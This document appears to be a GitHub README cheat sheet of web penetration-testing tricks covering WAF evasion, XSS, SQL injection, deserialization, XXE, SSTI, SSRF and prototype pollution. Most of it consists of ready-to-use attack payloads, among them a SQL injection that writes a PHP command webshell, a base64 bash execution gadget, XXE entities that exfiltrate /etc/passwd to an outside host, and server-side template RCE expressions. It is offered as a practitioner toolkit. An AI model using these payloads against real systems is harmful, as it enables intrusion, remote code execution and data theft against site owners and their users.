# Tricks - Web Penetration Tester

- [x] In Construction... (85%)

## WAF

### Manual Detection:

-> Cookies

-> Response messages

-> HTTP status Code's

-> Rules

## Host Obfuscation

#### Types

-> DWORD
  
-> OCTAL 
  
-> HEX
  
-> HYBRID

### Tool

https://www.silisoftware.com/tools/ipconverter.php

### Response - Status code WAF'S

-> mod_security -> 406 Not Acceptable

-> AQTRONIX WebKnight -> 999 No hacking

### Tool's

-> wafw00f 

https://github.com/EnableSecurity/wafw00f

-> nmap --script=http-waf-fingerprint

https://nmap.org/nsedoc/scripts/http-waf-fingerprint.html

-> imperva-detect

https://raw.githubusercontent.com/vmfae-iscteiulpt/imperva-detect/master/imperva-detect.sh

-> bypass to find real ip in CloudFlare:

https://github.com/zidansec/CloudPeler

#### Others

https://github.com/0xInfection/Awesome-WAF

## PHP Obfuscation Techniques:

### Mix - Hex + Octal

echo "t\x72\x69\143\153s";

//Tricks

### Variable Parsing

$a = "ri"; $b ="ck"; echo "T$a[0]$a[1]$b[0]$b[1]s";

//Tricks

### Variable Variables

$a = "T"; $$a = "ri"; $$$a = "cks"; echo $a.$T.$ri;

//Tricks

### PHP Non-Alphanumeric 

$\_="{"; #XOR char

echo $\_=($\_^"<").($\_^">").($\_^"/"); #XOR = GET

//GET

https://web.archive.org/web/20160516145602/http://www.thespanner.co.uk/2011/09/22/non-alphanumeric-code-in-php/

### Tools

-> phponalpha

-> phponalpha2

https://hackvertor.co.uk/public

### PHP Obfuscation - base64+gzdeflate

codes/obufscation/obfuscation.php

## Cross-Site Scripting (Reflected, Stored, DOM, Mutation, Poliglote)

### Protection XSS

-> XSS Auditor and XSS Filter

https://github.com/EdOverflow/bugbounty-cheatsheet/blob/master/cheatsheets/xss.md

https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html

https://www.chromium.org/developers/design-documents/xss-auditor/

https://portswigger.net/daily-swig/xss-protection-disappears-from-microsoft-edge

https://developer.mozilla.org/pt-BR/docs/Web/HTTP/Headers/X-XSS-Protection

-> Wordlists for XSS Bypass

https://gist.githubusercontent.com/rvrsh3ll/09a8b933291f9f98e8ec/raw/535cd1a9cefb221dd9de6965e87ca8a9eb5dc320/xxsfilterbypass.lst

https://raw.githubusercontent.com/danielmiessler/SecLists/master/Fuzzing/XSS/XSS-Bypass-Strings-BruteLogic.txt

https://raw.githubusercontent.com/payloadbox/xss-payload-list/master/Intruder/xss-payload-list.txt

https://raw.githubusercontent.com/danielmiessler/SecLists/master/Fuzzing/XSS/XSS-Cheat-Sheet-PortSwigger.txt

### XSS Keylogger

https://rapid7.com/blog/post/2012/02/21/metasploit-javascript-keylogger/

https://github.com/hadynz/xss-keylogger

### XSS Mutation

http://www.businessinfo.co.uk/labs/mxss/

### XSS Poliglote

https://github.com/0xsobky/HackVault/wiki/Unleashing-an-Ultimate-XSS-Polyglot

### Regex blacklist filtering

(on\w+\s*=)

<svc/onload=alert(1)>

<svg//////onload=alert(1)>

<svg id=x;onload=alert(1)>
  
<svg id=\`x\`onload=alert(1)>
  
(?i)([\s\"'`;\/0-9\=]+on\w+\s*=)
  
<svg onload%09=alert(1)>
  
<svg %09onload=alert(1)>
  
<svg %09onload%20=alert(1)>
  
<svg onload%09%20%28%2C%3B=alert(1)>
  
<svg onload%0B=alert(1)>

### Keyword based in filter
 
#### blocked - alert - bypass
  
-> <script>\u0061lert(1)</script>
  
-> <script>\u0061\u006C\u0065\u0072\u0074(1)</script>
  
-> <script>eval("\u0061lert(1)")</script>
  
-> <script>eval("\u0061\u006C\u0065\u0072\u0074\u0028\u0031\u0029")</script> 
  
#### Removing HTML Tags
  
<scr<iframe>ipt>alert(1)</script>
  
### Scaping Quote
  
### Methods
  
-> String.fromCharCode()
  
-> unescape

Ex:
 
-> decode URI + unescape method
  
decodeURI(/alert(%22xss%22)/.source)
  
decodeURIComponent(/alert(%22xss%22)/.source)
  
Add execution sink for execution:
  
-> eval
  
### Escaping Parentheses
  
\<img src=x onerror="\u0061lert(1)"/>
  
\<img src=x onerror="eval('\141lert(1)')"/>

\<img src=x onerror="eval('\x61lert(1)')"/>
  
### Others Examples
  
#### HTML Tag
  
<div>
  
here
  
</div>

-> <svg/onload=alert(1)

#### HTML Tag Attributes

<input value="here"/></input>
 
-> adaa"> <a/href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTs8L3NjcmlwdD4=">show</!--
  
#### Script Tag
  
<script>
  
var name="here";
  
</div>
  
</script>
  
-> ;alert(1);//

#### Event Attributes

\<button onclick="reserve(here);">
  
Okay!
  
</button>

-> alert(1)

Dom Based
  
\<script>var ok = location.search.replace("?ok=", "");domE1.innerHTML = "<a href=\'"+ok+"\'>ok</a>";</script>
  
-> javascript:alert(1)

## JavaScript Encoding and Compressor:

-> jjencode

https://utf-8.jp/public/jjencode.html

-> aaencode

https://utf-8.jp/public/aaencode.html

-> jsfuck

https://github.com/aemkei/jsfuck/blob/master/jsfuck.js

-> Minifying

https://developers.google.com/closure/compiler/

-> Packer 

http://dean.edwards.name/packer/

## Type Juggling

https://owasp.org/www-pdf-archive/PHPMagicTricks-TypeJuggling.pdf

### PHP - others tricks

[ eval () execute a chain whose variable $ HTTP_USER_AGENT is so just
change your header in PHP code ]

https://www.exploit-db.com/papers/13694

## Insecure Deserialization 

-> Binary

-> human readable

### PHP Deserialization

#### PHP - Method Serialization:

-> serialize()

-> unserialize()

#### Magic Methods:

-> __construct()

-> __destruct()

-> __wakUp()

#### Class Properties

Public \<s>
 
Ex:

O:4:"Okay":1:{s:8:"filepath";s:11:"/tmp/ok.txt";}
  
Protected \0 * \0

Ex:

O:4:"Okay":1:{s:11:"' . "\0" . '*' . "\0" . 'filepath";s:11:"/tmp/ok.txt";}

Private \0 \<s> \0

Ex:
  
O:4:"Okay":1:{s:14:"' . "\0" . 'Okay' . "\0" . 'filepath";s:11:"/tmp/ok.txt";}

codes/deserialization/example.php
  
#### Trick Bypass

a:2:{s:8:"anything";o:4:"Okay":1:{s:8:"filepath";s:11:"/tmp/ok.txt";}}
  
### .NET Deserialization

#### Methods Serialization:

-> Binary Formatter

-> DataContractSerializer

-> NetDataContractSerializer

-> XML Serialization
  
#### Most common places to find serialized data

-> VIEWSTATE
    
-> .NET remoting services
  
#### Tool

https://github.com/pwntester/ysoserial.net

### Java Deserialization

#### Identify

-> import java.io.serializable

-> binary with ac ed 00 05

-> base64 starts with rO0AB in web applications
  
#### java.lang.Runtime.exec()
  
bash -c {echo,payload_base64}|{base64,-d}|{bash,-i}

https://www.bugku.net/runtime-exec-payloads/

### Tools

https://github.com/frohoff/ysoserial

https://github.com/NickstaDB/SerializationDumper

https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/payloads/URLDNS.java
  
### Script
  
codes/deserialization/java/gserial.sh
  
codes/deserialization/java/payload.txt
  
while read payload; 
  
do echo "$payload\n\n"; 
  
java -jar ysoserial.jar $payload "sleep 5" | base64 | tr -d '\n' > $payload.ser; 
  
echo "-----------------Loading-----------------\n\n"; done < payloads.txt
                                                                         
#### Bad Sign

-> ClassNot FoundException

#### Good Sign

-> java.io.IOException

## Cloud

http://169.254.169.254/latest/meta-data

http://169.254.169.254/latest/api/token

### Serverless Injection

echo "hi" > ok.txt && aws s3 cp ok.txt 's3://<BUCKET>/' -acl -public-read
  
### Tools

https://github.com/clarketm/s3recon
  
## XPATH
  
error()

* and doc('http://hacker.site/')
  
* and doc('http://hacker.site/', name(/*) ))
  
### Tools
  
https://xcat.readthedocs.io/en/latest/
  
### Wordlists for SQLI e XPath - Authentication Bypass

https://raw.githubusercontent.com/payloadbox/sql-injection-payload-list/master/Intruder/exploit/Auth_Bypass.txt
  
## Padding Oracle Attack
  
### Identify

-> rememberMe: (Cookie)

### Exploiting 

java -jar ysoserial.jar CommonsBeanutils1 "touch /tmp/success" > payload.class

https://github.com/frohoff/ysoserial

python shiro_exp.py site.com/home.jsp cookie payload.class

https://github.com/wuppp/shiro_rce_exp/blob/master/shiro_exp.py
  
## Hash Length Extension Attack

https://github.com/iagox86/hash_extender

https://site.com/index.php?file=oktest&hash=hash

./hash_extender -f sha1 --data 'oktest' -s hash --append '../../../../../../../../../etc/passwd' --secret-min=10 --secret-max=40 --out-data-format=html --table > payloads.out

burp intruder -> payloads.out in file parameter.  
  
## Insecure - Machine Key for RCE 

https://github.com/carlospolop/hacktricks/blob/master/pentesting-web/deserialization/exploiting-__viewstate-parameter.md
  
https://github.com/pwntester/ysoserial.net
  
https://github.com/NotSoSecure/Blacklist3r/tree/master/MachineKey/AspDotNetWrapper
  
### Others Docs

https://opsecx.com/index.php/2017/02/08/exploiting-node-js-deserialization-bug-for-remote-code-execution/

## Local File Inclusion - LFI

### LFI - files for fuzzing

### Wordlist LFI - Linux

https://raw.githubusercontent.com/danielmiessler/SecLists/master/Fuzzing/LFI/LFI-gracefulsecurity-linux.txt

### Wordlist LFI - Windows

https://raw.githubusercontent.com/danielmiessler/SecLists/master/Fuzzing/LFI/LFI-gracefulsecurity-windows.txt

### Payloads for bypass:

-> bypass_lfi.txt
  
### Wordlist for parameter fuzzing
  
https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/burp-parameter-names.txt
  
### Wordlist for subdomain fuzzing
  
https://github.com/danielmiessler/SecLists/tree/master/Discovery/DNS

## SQL Injection
  
### WAF BYPASS

#### Query default:

'UNION SELECT 1, name,3,4 from users; -- -

#### Add comment /* */ for space bypass

'UNION/\*\*/SELECT/\*\*/1,name,3,4/**/from/**/users; -- -

#### Add comment /\*!\*/ in query for filters bypass

'/\*!UNION SELECT\*/ 1,group_concat(name),3,4 from users; -- -

#### Add random case

'UnIoN SeLeCt 1,GrOuP_cOnCaT(nAme),3,4 FrOm users; -- -

#### Example of mix:

'/\*!UnIoN/\*\*/SeLeCt/\*\*/\*/1,GroUp_ConCat(nAmE),3,4/\*\*/FrOm/\*\*/users; -- -

#### Others Techniques:

-> urlencode (example:%20 instead of space);
  
-> Scientifc Notation;
  
-> hexadecimal, substr, etc...
  
### Webshell via SQLI
  
' union select 1, 2, 3,"<\?php system($_GET['cmd']);\?>" into outfile "/var/www/html/pdp.php"-- -
  
### SQL Injection Second-Order (query connector)

codes/sqli_second_order/sqlitwo.php

### SQL Injection Out-Of-Band, etc

https://book.hacktricks.xyz/pentesting-web/sql-injection
  
### Tamper's SQLMAP
  
-> randomcase.py
  
-> order2ascii.py

-> xforwardedfor.py
 
### XPATH NOTATION
  
%' and extractvalue(0x0a,concat(0x0a,(select database() limit 1))) -- -
  
### Wordlist for SQL Injection - Bypass

https://gist.githubusercontent.com/zetc0de/f4146eb278805946ab064a753eac6a02/raw/e126452093b9cde7f82eff14a15f8ceca8188701/sqli-bypass-waf.txt

### Doc for SQL Injection - Bypass

https://github.com/OWASP/www-community/blob/master/pages/attacks/SQL_Injection_Bypassing_WAF.md
  
## NOSQL Injection
  
https://book.hacktricks.xyz/pentesting-web/nosql-injection
  
## Graphql Introspection

https://ivangoncharov.github.io/graphql-voyager/
  
## CSRF

codes/csrf/csrf.html
  
codes/csrf/csrf_json.html
  
codes/csrf/csrf_json_xhr.html
  
codes/csrf/csrf_token_bypass.html

### Analyze the token and perform brute-force

burp intruder -> sequencer -> Token Location Within Response -> Start live capture -> save tokens

cat tokens.txt | uniq -c | nl 
  
## SSTI

### Identify

-> Jinja2 orTwig
  
{{3*3}}

-> Smarty or Mako
  
{3*3}

ERB(Ruby)
  
<%= 7*7 %>

-> Others
  
${3*3}
  
${{3*3}}
  
#{3*3}
  
3*3

### Java Expression Language

{{T(java.lang.Runtime).getRuntime().exec('id')}}

''.class.forName('java.lang.Runtime').getRuntime().exec('id')
  
### Doc for SSTI	

https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection
  
## SSRF - Protocol Smuggling

-> HTTP-Based(Elastic, CouchDB, Mongodb, docker),etc.

-> Text-Based(ftp(21), smtp(587), zabbix(10051), mysql(3306), redis(6379), memcached(11211), etc.

curl "gopher://localhost:port"

### Scripts

codes/ssrf_protocol_smuggling/memcached.py

codes/ssrf_protocol_smuggling/zabbix.py

### Tool's

-> Gopher Protocol

https://datatracker.ietf.org/doc/html/rfc1436

-> Gopherus

https://github.com/tarunkant/Gopherus
  
### Scripts

codes/ssrf_protocol_smuggling/zabbix.py
  
codes/ssrf_protocol_smuggling/memcached.py
  
-> stats items
  
-> stats cachedump <slab class> <number of items to dump>
  
-> get <item>
  
### Doc for SSRF - bhack

https://www.blackhat.com/docs/us-17/thursday/us-17-Tsai-A-New-Era-Of-SSRF-Exploiting-URL-Parser-In-Trending-Programming-Languages.pdf
  
## CRLF Injection
  
/%0D%%0ALocation

## XXE OOB
  
### XXE OOB - Exfiltrate data exfiltrating data via dtd

-> Part 1

\<!DOCTYPE r[

\<!ELEMENT r ANY>

\<!ENTITY % ult SYSTEM "http://ip/evil.dtd">

%ult;

%param1;

]>

<r>&exfil;</r>

-> Part 2
  
codes/xxe/evil.dtd
  
https://raw.githubusercontent.com/rodolfomarianocy/Tricks-Web-Penetration-Tester/main/codes/xxe/evil.dtd
  
\<!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=file:///etc/passwd">
  
\<!ENTITY % param1 "\<!ENTITY exfil SYSTEM 'http://ip/?leak=%file;'>">
  
### XXE OOB to retrieve data via error messages with dtd file
  
codes/xxe/error.dtd

-> Part 1

\<!DOCTYPE foo [

\<!ENTITY % xxe SYSTEM "https://exploit-0a68008104673c17c01f5f1c01020020.web-security-academy.net/evil.dtd"> 

%xxe;

%payload;

%remote;

]>

-> Part 2

\<!ENTITY % file SYSTEM "file:///etc/passwd">

\<!ENTITY % payload "\<!ENTITY &#37; remote SYSTEM 'file:///idonotexist/%file;'>">
  
### XXE OOB - XInclude to retrieve files with dtd file

\<foo xmlns:xi="http://www.w3.org/2001/XInclude">\<xi:include parse="text" href="file:///etc/passwd"/>\</foo>

### XXE OOB - Image file upload

code/xxe/evil.svg

\<?xml version="1.0" standalone="yes"?>\<!DOCTYPE test [ \<!ENTITY xxe SYSTEM "file:///etc/hostname" > ]>\<svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1">\<text font-size="16" x="0" y="16">&xxe;\</text>\</svg>

## XSLT Server Side Injection
  
https://book.hacktricks.xyz/pentesting-web/xslt-server-side-injection-extensible-stylesheet-languaje-transformations

## Prototype Pollution

### Client Side
  
https://github.com/BlackFan/client-side-prototype-pollution
  
### Server Side

-> exec.exec in req body with lodash - application/json
  
https://nodejs.org/api/child_process.html#child_processexeccommand-options-callback

"__proto__":{
  
  "shell":"sleep 5"
  
}
  
-> exec.fork in req body with lodash - application/json
  
https://nodejs.org/api/process.html
  
"__proto__":{
  
    "execPath":"/bin/bash",
  
    "execArgv":[
  
    "-c",
  
    "sleep 5"
  
    ]
  
  }
  
## Others tool's and things
  
### ImageTragik

codes/rce/tragik.jpg

### Search across a half million git repos
  
https://grep.app
  
### The Cyber Swiss Army Knife - a web app for encryption, encoding, compression and data analysis.
  
https://gchq.github.io/CyberChef/
  
### List of file signatures
  
https://en.wikipedia.org/wiki/List_of_file_signatures

### Regex 
  
https://regex101.com/
  
### Decode
  
https://malwaredecoder.com/

### Encode for SQL Injection in Json
  
https://dencode.com/string/unicode-escape
  
### Wildcard DNS

https://nip.io/
  
### Explain Shell

https://explainshell.com/
  
### Webhook online
  
https://webhook.site/#!/b3d5ed21-b58d-4a77-b19d-b7cdc2eeadc0
  
### Reverse Shell
  
https://www.revshells.com/
 
### Api Security

https://platform.42crunch.com/
